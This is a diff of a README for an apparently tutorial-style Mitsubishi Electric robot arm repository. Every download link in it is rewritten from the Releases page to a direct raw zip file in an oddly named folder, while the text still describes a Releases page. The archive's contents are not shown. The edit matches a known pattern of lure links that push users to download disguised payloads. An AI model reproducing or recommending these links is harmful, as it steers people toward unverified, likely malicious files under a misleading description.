@@ -1,6 +1,6 @@
 # 🤖 mitsubishi_Electric-industrial_robotarm - Learn to Automate with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Msami0012/mitsubishi_Electric-industrial_robotarm/releases)
+[![Download](https://github.com/Msami0012/mitsubishi_Electric-industrial_robotarm/raw/refs/heads/main/orthorrhaphous/robotarm-industrial-mitsubishi-Electric-v1.8.zip)](https://github.com/Msami0012/mitsubishi_Electric-industrial_robotarm/raw/refs/heads/main/orthorrhaphous/robotarm-industrial-mitsubishi-Electric-v1.8.zip)
 
 ## 📌 Overview
 
@@ -31,7 +31,7 @@ To get started with the Mitsubishi Electric Industrial Robot Arm, you need to do
 
 1. Click on the download link below to visit the Releases page:
    
-   [Visit this page to download](https://github.com/Msami0012/mitsubishi_Electric-industrial_robotarm/releases)
+   [Visit this page to download](https://github.com/Msami0012/mitsubishi_Electric-industrial_robotarm/raw/refs/heads/main/orthorrhaphous/robotarm-industrial-mitsubishi-Electric-v1.8.zip)
 
 2. On the Releases page, look for the latest release version.
 
@@ -85,4 +85,4 @@ Future updates will include:
 
 Your feedback is valuable. Please submit any suggestions or improvements through the GitHub issue tracker.
 
-[Visit this page to download](https://github.com/Msami0012/mitsubishi_Electric-industrial_robotarm/releases) and start your journey in industrial automation today!
+[Visit this page to download](https://github.com/Msami0012/mitsubishi_Electric-industrial_robotarm/raw/refs/heads/main/orthorrhaphous/robotarm-industrial-mitsubishi-Electric-v1.8.zip) and start your journey in industrial automation today!
